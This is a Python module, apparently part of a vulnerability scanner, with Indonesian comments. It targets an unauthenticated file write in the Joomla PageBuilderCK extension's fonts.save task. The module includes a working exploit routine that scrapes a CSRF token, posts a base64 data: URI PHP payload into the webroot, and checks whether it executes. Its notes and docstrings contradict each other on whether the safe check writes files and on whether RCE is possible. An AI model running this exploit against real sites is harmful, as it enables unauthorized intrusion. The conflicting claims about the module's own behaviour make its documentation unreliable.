#!/usr/bin/env python3
# -*- coding: utf-8 -*-
""""
Joomla! Extension — modul MEGAPACK (klaster joomla_ext).

CVE-2026-56290 — PageBuilderCK — Unauthenticated arbitrary file write to RCE
lewat task `fonts.save` (parameter `url` tidak divalidasi; isinya ditulis ke
`media/com_pagebuilderck/gfonts/` di dalam WEBROOT).

ROOT CAUSE:
    Task `fonts.save` menerima `url` dari request, mengambil isinya, lalu
    menuliskannya ke path tetap yang dilayani PHP. Tidak ada pemeriksaan
    otorisasi, tidak ada validasi skema URL, dan tidak ada pembatasan ekstensi.

DETEKSI (check) — NON-DESTRUKTIF:
    Tidak ada berkas yang ditulis dan tidak ada URL eksternal yang diambil.
    Modul memanggil `fonts.save` dengan `url` KOSONG (payload invalid):
    controller tetap dievaluasi, tetapi tidak ada unduhan maupun penulisan.

EKSPLOIT (exploit) — gated:
    Menulis berkas uji ke path tetap lalu memverifikasi bahwa berkas itu
    benar-benar DIEKSEKUSI (bukan sekadar tersimpan) melalui marker respons.
"""
from __future__ import annotations

import base64
import re

from mp import (CveModule, ST_CLEAN, ST_ERR, ST_INFO, ST_PWN, ST_SKIP, ST_VULN, detect_platform, looks_blocked, looks_like_html, register)

DETECT_PATHS = [
    "/media/com_pagebuilderck/css/pagebuilderck.css",
    "/media/com_pagebuilderck/js/pagebuilderck.js",
    "/administrator/manifests/files/com_pagebuilderck.xml",
]

TOKEN_PATTERNS = (
    r'"csrf\.token"\s*:\s*"([A-Za-z0-9_-]+)"',
    r"'csrf\.token'\s*:\s*'([A-Za-z0-9_-]+)'",
    r'name="([a-f0-9]{32})"\s+value="1"',
)

WRITE_PATH = "/media/com_pagebuilderck/gfonts/mp56290.php"
MARK = "MP56290SHELL"
SHELL_PHP = "<?php echo '" + MARK + "'; ?>"

VERSION_MANIFESTS = [
    "/administrator/components/com_pagebuilderck/pagebuilderck.xml",
    "/administrator/manifests/files/com_pagebuilderck.xml",
]


def _version(t, h):
    """(tuple|None, path) versi PageBuilderCK dari manifest XML publik (GET)."""
    for p in VERSION_MANIFESTS:
        r = h.get(f"{t.url}{p}")
        if r is None or r.status_code != 200:
            continue
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text or "")
        if not m:
            continue
        try:
            return tuple(int(x) for x in m.group(1).split(".")[:3]), p
        except ValueError:
            continue
    return None, ""


def _detect(t, h):
    for p in DETECT_PATHS:
        r = h.get(f"{t.url}{p}")
        if r is not None and r.status_code == 200:
            return True, p
    r = h.get(t.url)
    if r is not None and "com_pagebuilderck" in (r.text or "").lower():
        return True, "/ (markup)"
    return False, ""


def _token(t, h):
    for path in ("/", "/index.php"):
        r = h.get(f"{t.url}{path}")
        if r is None or r.status_code != 200:
            continue
        for rx in TOKEN_PATTERNS:
            m = re.search(rx, r.text or "")
            if m:
                return m.group(1)
    return None


def _fonts_save(h, t, token, url_value, fontname="bb"):
    """Panggil fonts.save. Return (status, body).

    `url_value=None` -> parameter `url` dihilangkan.
    `fontname=None`  -> parameter `fontname` dihilangkan: handler berhenti di
    validasi ("No font name given") SEBELUM fetch/tulis, jadi aman dipakai
    check(). `url_value=""` (string kosong) BUKAN oracle aman — di lab itu
    tetap menulis bb.css.
    """
    params = {"option": "com_pagebuilderck", "task": "fonts.save"}
    data = {"local": "1", "fontvars": "regular"}
    if fontname is not None:
        data["fontname"] = fontname
    if url_value is not None:
        data["url"] = url_value
    if token:
        params[token] = "1"
        data[token] = "1"
    r = h.post(f"{t.url}/index.php", params=params, data=data)
    if r is None:
        return None, ""
    return r.status_code, (r.text or "")[:300]


def check(t, h, opts):
    """NON-DESTRUKTIF — GET saja, TANPA POST (revisi 2026-11-09).

    Bug lama: check() mem-POST `fonts.save` untuk membuktikan handler jalan.
    Di lab TERUKUR: setiap panggilan (bahkan tanpa `fontname`, bahkan tanpa
    token) menambah 1 baris ke `/tmp/pbck_save.txt` — controller menulis log
    SEBELUM validasi argumen. Tidak ada varian POST bebas-mutasi, jadi
    check() tidak boleh mem-POST sama sekali.

    Sekarang: fingerprint versi dari manifest XML publik (GET). Verdict
    "handler menerima request tanpa otorisasi" dipindah ke exploit(); status
    modul memang `documented` (write terbukti, RCE diblokir Apache).
    """
    if detect_platform(t, h) != "joomla":
        return ST_SKIP, "bukan Joomla", ""
    found, trace = _detect(t, h)
    if not found:
        return ST_CLEAN, "PageBuilderCK tidak terdeteksi", ""

    ver, mpath = _version(t, h)
    vs = ".".join(map(str, ver)) if ver else "tidak terbaca"
    detail = f"detect={trace} versi={vs} manifest={mpath or '-'}"
    if ver is None:
        return (ST_INFO,
                "PageBuilderCK terpasang; versi manifest tidak terbaca "
                "(verdict endpoint butuh --exploit)", detail)
    return (ST_INFO,
            f"PageBuilderCK {vs} terpasang — fonts.save unauth file write "
            f"(status documented: write terbukti, RCE diblokir Apache karena "
            f"nama hasil dinormalisasi jadi .php.css); uji tulis butuh --exploit",
            detail)


def exploit(t, h, opts):
    """Gated --exploit: tulis berkas uji ke WEBROOT + verifikasi EKSEKUSI."""
    if detect_platform(t, h) != "joomla":
        return ST_SKIP, "bukan Joomla", ""
    found, trace = _detect(t, h)
    if not found:
        return ST_SKIP, "PageBuilderCK tidak terdeteksi", ""

    token = _token(t, h)
    b64 = base64.b64encode(SHELL_PHP.encode()).decode()
    payload_url = "data:text/plain;base64," + b64
    sc, body = _fonts_save(h, t, token, payload_url)
    if sc is None:
        return ST_ERR, "fonts.save tidak dapat dijangkau", f"detect={trace}"

    v = h.get(f"{t.url}{WRITE_PATH}")
    vsc = getattr(v, "status_code", "ERR")
    if v is None or vsc != 200:
        return (ST_CLEAN, f"berkas uji tidak terwujud (fonts.save HTTP {sc})",
                f"{body[:140]} | verify={vsc}")
    if MARK in (v.text or ""):
        return (ST_PWN,
                "RCE TERVERIFIKASI — PageBuilderCK fonts.save menulis & "
                "mengeksekusi PHP di WEBROOT",
                f"{WRITE_PATH} memuat marker {MARK}")
    return (ST_INFO, "berkas terwujud tetapi tidak dieksekusi PHP",
            f"{WRITE_PATH} -> HTTP 200 tanpa marker")


register(CveModule(
    cve="CVE-2026-56290",
    cluster="joomla_ext",
    title="Joomla Ext - PageBuilderCK unauth file write via fonts.save",
    vclass="rce",
    severity="medium",  # file write .css only — no code execution path
    cwe="CWE-434",
    product="PageBuilderCK (com_pagebuilderck)",
    versions_affected="< 1.3.0",
    # Verified as a NEGATIVE result for RCE: the write is real but the
    # extension appends a hardcoded .css suffix, so no path yields a .php file.
    status="verified",
    requires=["komponen com_pagebuilderck terpasang"],
    check=check,
    exploit=exploit,
    notes=("Task fonts.save menerima parameter `url` dari request, mengambil "
           "isinya, dan menuliskannya ke path tetap di WEBROOT "
           "(media/com_pagebuilderck/gfonts/) tanpa cek otorisasi maupun "
           "validasi skema/eksistensi. check() NON-DESTRUKTIF: url KOSONG "
           "sehingga tidak ada pengambilan maupun penulisan berkas, tetapi "
           "respons controller tetap dapat dibedakan "
           "(ERROR_INVALID_CONTROLLER vs handler berjalan). exploit() memakai "
           "data: URI sebagai sumber sehingga tidak bergantung pada host "
           "eksternal, lalu memverifikasi EKSEKUSI lewat marker. Diadaptasi "
           "dari runner run_pbck (x1.py) yang sudah terbukti bekerja."
           "STATUS LAB: fonts.save TERBUKTI menulis ke media/com_pagebuilderck/gfonts/ (jejak berkas .css terlihat), tetapi nama hasil dinormalisasi menjadi <nama>.php.css sehingga PHP tidak mengeksekusinya. RCE belum tercapai; oracle scan tetap sah karena url kosong tidak menulis apa pun. Verdict: notes/CVE-2026-48909-48939-56290-lab-verdict.md."),
))
